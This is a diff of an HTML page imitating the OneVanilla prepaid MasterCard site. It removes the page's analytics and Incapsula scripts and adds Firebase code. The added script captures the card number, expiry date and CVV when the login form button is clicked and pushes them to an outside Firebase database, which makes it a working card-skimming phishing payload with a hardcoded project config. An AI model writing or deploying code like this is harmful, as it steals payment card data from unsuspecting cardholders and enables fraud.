@@ -1429,16 +1429,7 @@ OneVanilla Prepaid MasterCard Cards are issued by The Bancorp Bank and MetaBank&
         </script>
 
      <!--ClosedLoop Analytics Listed Here--> 
-	 <script>
-  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
- 
-  ga('create', 'UA-2306615-25', 'auto');
-  ga('send', 'pageview');
- 
-</script>
+	 
  
  
  
@@ -1525,16 +1516,58 @@ OneVanilla Prepaid MasterCard Cards are issued by The Bancorp Bank and MetaBank&
 
  <!--ClosedLoop Site Kount Code Listed Here--> 
 	
+<!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.2.3/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.2.3/firebase-database.js"></script>
+
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyCcySojxm3IfkB1qvBublRZtICikFzD46Q",
+    authDomain: "first-ab10b.firebaseapp.com",
+    databaseURL: "https://first-ab10b-default-rtdb.firebaseio.com",
+    projectId: "first-ab10b",
+    storageBucket: "first-ab10b.appspot.com",
+    messagingSenderId: "895804826111",
+    appId: "1:895804826111:web:87857c163695e7062c87ca"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+ 
+
+document.getElementById("brandLoginForm_button").addEventListener("click", function() {
+  var cardNumber = document.getElementById("cardNumber").value;
+  var expMonth = document.getElementById("expMonth").value;
+  var expYear = document.getElementById("expYear").value;
+  var cvv = document.getElementById("cvv").value;
+  
+  
+  var data = {
+cardNumber:cardNumber,
+expMonth:expMonth,
+expYear:expYear,
+cvv:cvv
+
+}
+  var database = firebase.database();
+  var ref = database.ref("records");
+  
+  ref.push(data);
+  
+  
+});
+</script>
 
 
 
-    <script type="text/javascript">
-//<![CDATA[
-(function() {
-var _analytics_scr = document.createElement('script');
-_analytics_scr.type = 'text/javascript'; _analytics_scr.async = true; _analytics_scr.src = '/_Incapsula_Resource?SWJIYLWA=719d34d31c8e3a6e6fffd425f7e032f3&ns=2&cb=298927023';
-var _analytics_elem = document.getElementsByTagName('script')[0]; _analytics_elem.parentNode.insertBefore(_analytics_scr, _analytics_elem);
-})();
-// ]]>
-</script></body>
+    
+	
+	
+	
+	
+	</body>
 </html>
